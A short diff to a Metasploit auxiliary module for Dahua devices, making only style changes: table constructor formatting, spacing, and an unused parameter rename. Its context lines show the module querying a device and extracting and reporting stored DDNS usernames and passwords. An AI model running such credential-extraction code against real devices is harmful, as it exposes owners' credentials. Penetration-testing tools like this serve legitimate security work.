@@ -126,11 +126,11 @@ class Metasploit3 < Msf::Auxiliary
     sock.put(DDNS)
     return unless (response = sock.get_once)
     data = response.split(/&&[0-1]&&/)
-    ddns_table = Rex::Ui::Text::Table.new({
-     'Header' => 'Dahua DDNS Settings',
-     'Indent' => 1,
-     'Columns' => ['DDNS Service', 'DDNS Server', 'DDNS Port', 'Domain', 'Username', 'Password']
-    })
+    ddns_table = Rex::Ui::Text::Table.new(
+      'Header' => 'Dahua DDNS Settings',
+      'Indent' => 1,
+      'Columns' => ['DDNS Service', 'DDNS Server', 'DDNS Port', 'Domain', 'Username', 'Password']
+    )
     data.each_with_index do |val, index|
       next if index == 0
       val = val.split("&&")
@@ -140,7 +140,7 @@ class Metasploit3 < Msf::Auxiliary
       ddns_domain = "#{val[3]}"
       ddns_user = "#{val[4]}"
       ddns_pass = "#{val[5]}"
-      ddns_table << ["#{ddns_service}", "#{ddns_server}", "#{ddns_port}","#{ddns_domain}", "#{ddns_user}", "#{ddns_pass}"]
+      ddns_table << ["#{ddns_service}", "#{ddns_server}", "#{ddns_port}", "#{ddns_domain}", "#{ddns_user}", "#{ddns_pass}"]
       ddns_table.print
       unless ddns_server.blank? && ddns_port.blank? && ddns_user.blank? && ddns_pass.blank?
         report_ddns_cred(rhost, ddns_port, ddns_user, ddns_pass)
@@ -256,7 +256,7 @@ class Metasploit3 < Msf::Auxiliary
     "#{rhost}:#{rport}"
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     begin
       connect
       sock.put(U1)
